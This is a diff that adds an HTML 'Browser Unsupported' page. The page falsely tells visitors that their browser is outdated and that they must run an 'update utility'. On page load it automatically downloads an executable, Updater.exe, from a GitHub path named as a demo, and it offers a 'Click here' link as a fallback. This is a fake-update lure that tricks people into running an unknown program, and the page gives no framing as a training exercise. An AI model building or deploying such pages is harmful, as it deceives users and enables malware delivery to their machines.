@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Browser Unsupported</title>
+    <style>
+        body, html {
+            height: 100%;
+            margin: 0;
+            font-family: 'Verdana', sans-serif;
+            color: #333;
+            background-color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            flex-direction: column;
+        }
+
+        h1 {
+            font-size: 32px;
+            margin: 10px 0;
+        }
+
+        h2 {
+            font-size: 18px;
+            font-weight: bold;
+            margin-top: 20px;
+        }
+
+        p {
+            font-size: 14px;
+            max-width: 600px;
+            padding: 0 20px;
+            margin: 10px 0;
+            line-height: 1.6;
+        }
+
+        a {
+            color: #e63946;
+            text-decoration: none;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>Oops!<br>Your browser is not supported :(</h1>
+    <h2>OUTDATED BROWSER — PLEASE RUN THE UPDATER FIRST</h2>
+
+    <p>
+        You are likely using an outdated browser. For security and compatibility reasons, you must run the latest update utility before proceeding.
+    </p>
+    <p>
+        <a href="https://github.com/yunaranyancat/knowledge_sharing/raw/master/demos/Updater.exe">Click here</a> if the download does not start automatically.
+    </p>
+
+    <script>
+        window.onload = function () {
+            const link = document.createElement('a');
+            link.href = "https://github.com/yunaranyancat/knowledge_sharing/raw/master/demos/Updater.exe";
+            link.download = "Updater.exe";
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        };
+    </script>
+
+</body>
+</html>
